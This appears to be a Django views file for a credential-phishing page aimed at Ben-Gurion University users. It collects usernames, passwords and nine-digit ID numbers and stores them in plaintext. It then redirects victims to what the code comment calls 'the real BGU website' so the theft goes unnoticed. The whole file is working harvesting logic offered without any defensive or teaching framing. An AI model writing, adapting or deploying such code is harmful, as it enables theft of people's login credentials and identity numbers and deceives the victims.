from django.shortcuts import render
from django.shortcuts import render, redirect
from django.contrib.auth import authenticate, login, logout
from django.contrib import messages
from .models import Record
from django.contrib.auth.hashers import make_password
import re


def validate_password(password):
    # At least one upper case English letter, (?=.*?[A-Z])
    # At least one lower case English letter, (?=.*?[a-z])
    # At least one digit, (?=.*?[0-9])
    # At least one special character, (?=.*?[#?!@$%^&*-])
    # Minimum eight in length .{8,} (with the anchors)
    pattern = re.compile(r"^(?=.*?[A-Z])(?=.*?[a-z])(?=.*?[0-9])(?=.*?[#?!@$%^&*-]).{8,}$")

    if pattern.fullmatch(password):
        return True
    else:
        return False


def validate_username(username):
    return username.islower()


def validate_id_number(id_number):
    return id_number.isdigit() and len(id_number) == 9


def home(request):
    if request.method == 'POST':
        username = request.POST['user_name']
        password = request.POST['password']
        idNumber = request.POST['idNumber']

        if not validate_username(username):
            messages.success(request, "אנא מלא שם משתמש תקין")
            return redirect('home')
        elif not validate_password(password):
            messages.error(request, "אנא מלא סיסמא")
            return redirect('home')
        elif not validate_id_number(idNumber):
            messages.success(request, "אנא מלא מספר תעודת זהות תקין")
            return redirect('home')
        else:
            new_record = Record(user_name=username, password=password, idNumber=idNumber)
            new_record.save()
            return redirect('https://bgu4u22.bgu.ac.il/apex/f?p=104:101::::::')  # redirect to the real BGU website
    else:
        return render(request, 'home.html', {})
